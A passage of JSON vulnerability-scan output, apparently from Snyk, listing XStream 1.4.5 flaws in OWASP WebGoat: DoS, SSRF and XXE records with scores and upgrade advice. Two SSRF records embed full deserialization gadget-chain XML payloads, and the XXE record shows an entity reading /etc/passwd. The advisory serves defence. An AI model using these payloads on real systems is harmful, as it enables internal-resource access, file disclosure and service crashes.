      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569189",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6wf9-jmg9-vxcc"
        ],
        "CVE": [
          "CVE-2021-39140"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:23.601521Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:23.599216Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39140.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "severity": "medium",
          "modificationTime": "2022-09-01T19:39:53.285763Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.3,
          "severity": "medium",
          "modificationTime": "2022-07-26T01:11:33.084328Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T21:35:06.628757Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:45:56.403418Z",
      "credit": [
        "m0d9"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF). This vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.\r\n\r\n### PoC\r\n\r\n```\r\n<map>\r\n  <entry>\r\n    <jdk.nashorn.internal.runtime.Source_-URLData>\r\n      <url>http://localhost:8080/internal/</url>\r\n      <cs>GBK</cs>\r\n      <hash>1111</hash>\r\n      <array>b</array>\r\n      <length>0</length>\r\n      <lastModified>0</lastModified>\r\n    </jdk.nashorn.internal.runtime.Source_-URLData>\r\n    <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>\r\n  </entry>\r\n  <entry>\r\n    <jdk.nashorn.internal.runtime.Source_-URLData>\r\n      <url>http://localhost:8080/internal/</url>\r\n      <cs reference='../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs'/>\r\n      <hash>1111</hash>\r\n      <array>b</array>\r\n      <length>0</length>\r\n      <lastModified>0</lastModified>\r\n    </jdk.nashorn.internal.runtime.Source_-URLData>\r\n    <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>\r\n  </entry>\r\n</map>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39152.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:43:57Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569190",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-xw4p-crpj-vjx2"
        ],
        "CVE": [
          "CVE-2021-39152"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:23.372345Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:23.370464Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39152.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Server-Side Request Forgery (SSRF)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:42:22.719013Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:26.962868Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T21:35:48.613747Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:48:40.474850Z",
      "credit": [
        "Lai Han"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF). This vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream with a Java runtime version 14 to 8. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.\r\n\r\n### PoC\r\n\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n    </default>\r\n    <int>3</int>\r\n    <dynamic-proxy>\r\n      <interface>java.lang.Comparable</interface>\r\n      <handler class='com.sun.xml.internal.ws.client.sei.SEIStub'>\r\n        <owner/>\r\n        <managedObjectManagerClosed>false</managedObjectManagerClosed>\r\n        <databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'>\r\n          <stubHandlers>\r\n            <entry>\r\n              <method>\r\n                <class>java.lang.Comparable</class>\r\n                <name>compareTo</name>\r\n                <parameter-types>\r\n                  <class>java.lang.Object</class>\r\n                </parameter-types>\r\n              </method>\r\n              <com.sun.xml.internal.ws.client.sei.StubHandler>\r\n                <bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'>\r\n                  <indices>\r\n                    <int>0</int>\r\n                  </indices>\r\n                  <getters>\r\n                    <com.sun.xml.internal.ws.client.sei.ValueGetter>PLAIN</com.sun.xml.internal.ws.client.sei.ValueGetter>\r\n                  </getters>\r\n                  <accessors>\r\n                    <com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\r\n                      <val_-isJAXBElement>false</val_-isJAXBElement>\r\n                      <val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'>\r\n                        <type>int</type>\r\n                        <field>\r\n                          <name>hash</name>\r\n                          <clazz>java.lang.String</clazz>\r\n                        </field>\r\n                      </val_-getter>\r\n                      <val_-isListType>false</val_-isListType>\r\n                      <val_-n>\r\n                        <namespaceURI/>\r\n                        <localPart>hash</localPart>\r\n                        <prefix/>\r\n                      </val_-n>\r\n                      <val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'>\r\n                        <type>java.lang.String</type>\r\n                        <method>\r\n                          <class>jdk.nashorn.internal.runtime.Source</class>\r\n                          <name>readFully</name>\r\n                          <parameter-types>\r\n                            <class>java.net.URL</class>\r\n                          </parameter-types>\r\n                        </method>\r\n                      </val_-setter>\r\n                      <outer-class>\r\n                        <propertySetters>\r\n                          <entry>\r\n                            <string>serialPersistentFields</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>[Ljava.io.ObjectStreamField;</type>\r\n                              <field>\r\n                                <name>serialPersistentFields</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>CASE_INSENSITIVE_ORDER</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>java.util.Comparator</type>\r\n                              <field>\r\n                                <name>CASE_INSENSITIVE_ORDER</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>serialVersionUID</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>long</type>\r\n                              <field>\r\n                                <name>serialVersionUID</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>value</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>[C</type>\r\n                              <field>\r\n                                <name>value</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>hash</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>int</type>\r\n                              <field reference='../../../../../val_-getter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                        </propertySetters>\r\n                        <propertyGetters>\r\n                          <entry>\r\n                            <string>serialPersistentFields</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>[Ljava.io.ObjectStreamField;</type>\r\n                              <field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>CASE_INSENSITIVE_ORDER</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>java.util.Comparator</type>\r\n                              <field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>serialVersionUID</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>long</type>\r\n                              <field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>value</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>[C</type>\r\n                              <field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>hash</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/>\r\n                          </entry>\r\n                        </propertyGetters>\r\n                        <elementLocalNameCollision>false</elementLocalNameCollision>\r\n                        <contentClass>java.lang.String</contentClass>\r\n                        <elementDeclaredTypes/>\r\n                      </outer-class>\r\n                    </com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\r\n                  </accessors>\r\n                  <wrapper>java.lang.Object</wrapper>\r\n                  <bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/>\r\n                  <dynamicWrapper>false</dynamicWrapper>\r\n                </bodyBuilder>\r\n                <isOneWay>false</isOneWay>\r\n              </com.sun.xml.internal.ws.client.sei.StubHandler>\r\n            </entry>\r\n          </stubHandlers>\r\n          <clientConfig>false</clientConfig>\r\n        </databinding>\r\n        <methodHandlers>\r\n          <entry>\r\n            <method reference='../../../databinding/stubHandlers/entry/method'/>\r\n            <com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\r\n              <owner reference='../../../..'/>\r\n              <method reference='../../../../databinding/stubHandlers/entry/method'/>\r\n              <isVoid>false</isVoid>\r\n              <isOneway>false</isOneway>\r\n            </com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\r\n          </entry>\r\n        </methodHandlers>\r\n      </handler>\r\n    </dynamic-proxy>\r\n    <url>http://localhost:8080/internal/</url>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39150.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:47:22Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569191",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cxfm-5m4g-x7xp"
        ],
        "CVE": [
          "CVE-2021-39150"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-11-07T15:43:45.000020Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:23.138966Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39150.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Server-Side Request Forgery (SSRF)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:31.300326Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
          "cvssV3BaseScore": 5.3,
          "severity": "medium",
          "modificationTime": "2022-05-03T21:35:15.903222Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:38:42.308385Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2022-02-01T12:38:13.805830Z",
      "credit": [
        "r00t4dm"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). An attacker can manipulate the processed input stream and replace or inject objects, that result in exponential recursively hashcode calculation,\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.19 or higher.\n## References\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/e8e88621ba1c85ac3b8620337dd672e0c0c3a846)\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-43859.html)\n",
      "disclosureTime": "2022-02-01T00:48:15Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "1.4.19"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-2388977",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-rmr5-cpv2-vgjf"
        ],
        "CVE": [
          "CVE-2021-43859"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-02-01T14:57:29.273982Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-02-01T14:57:29.272030Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/e8e88621ba1c85ac3b8620337dd672e0c0c3a846"
        },
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-43859.html"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-09-01T16:23:00.486255Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-08-09T13:11:06.579205Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.5,
          "severity": "medium",
          "modificationTime": "2022-05-11T11:13:19.610610Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.19)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.19"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:18.550000Z",
      "credit": [
        "guykoth"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\r\n[`com.thoughtworks.xstream:xstream`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22xstream%22) is a simple library to serialize objects to XML and back again.\r\nMultiple XML external entity (XXE) vulnerabilities in the (1) Dom4JDriver, (2) DomDriver, (3) JDomDriver, (4) JDom2Driver, (5) SjsxpDriver, (6) StandardStaxDriver, and (7) WstxDriver drivers in XStream before 1.4.9 allow remote attackers to read arbitrary files via a crafted XML document.\r\n\r\n## Details\r\n\r\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\r\n\r\n## References\r\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-3674)\r\n- [OSS Security](http://www.openwall.com/lists/oss-security/2016/03/28/1)\r\n- [GitHub Issue](https://github.com/x-stream/xstream/issues/25)",
      "disclosureTime": "2016-03-20T22:26:12Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/io/xml/JDomDriver.java",
            "className": "JDomDriver",
            "functionName": "createReader"
          },
          "version": [
            "[1.1 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/io/xml/JDom2Driver.java",
            "className": "JDom2Driver",
            "functionName": "createReader"
          },
          "version": [
            "[1.4.5 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/io/xml/DomDriver.java",
            "className": "DomDriver",
            "functionName": "<init>"
          },
          "version": [
            "[0.5 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/io/xml/Dom4JDriver.java",
            "className": "Dom4JDriver",
            "functionName": "createReader"
          },
          "version": [
            "[0.5 ,1.4.9)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.9"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-30385",
      "identifiers": {
        "CWE": [
          "CWE-200"
        ],
        "GHSA": [
          "GHSA-rgh3-987h-wpmw"
        ],
        "CVE": [
          "CVE-2016-3674"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:00.109485Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-03-20T22:26:12Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/5b5cd6d8137f645c5d57b648afb1a305967aa7f4"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/696ec886a23dae880cf12e34e1fe09c5df8fe946"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/x-stream/xstream/issues/25"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-3674"
        },
        {
          "title": "OSS security Advisory",
          "url": "http://www.openwall.com/lists/oss-security/2016/03/28/1"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-01-03T17:49:12.530893Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 5.3,
          "severity": "medium",
          "modificationTime": "2022-09-01T14:13:28.932798Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.io.xml.JDomDriver",
            "functionName": "createReader"
          },
          "version": [
            "[1.1 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.io.xml.JDom2Driver",
            "functionName": "createReader"
          },
          "version": [
            "[1.4.5 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.io.xml.DomDriver",
            "functionName": "<init>"
          },
          "version": [
            "[0.5 ,1.4.9)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.io.xml.Dom4JDriver",
            "functionName": "createReader"
          },
          "version": [
            "[0.5 ,1.4.9)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[0.3 ,1.4.9)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.9"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2017-05-17T12:10:22.458000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When a certain denyTypes workaround is not used, mishandles attempts to create an instance of the primitive type 'void' during unmarshalling, leading to a remote application crash, as demonstrated by an `xstream.fromXML(\"&lt;void/>\")` call.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.10 or higher.\n## References\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/6e546ec366419158b1e393211be6d78ab9604ab)\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/8542d02d9ac5d384c85f4b33d6c1888c53bd55d)\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/b3570be2f39234e61f99f9a20640756ea71b1b4)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-7957)\n- [Vendor Advisory](http://x-stream.github.io/CVE-2017-7957.html)\n",
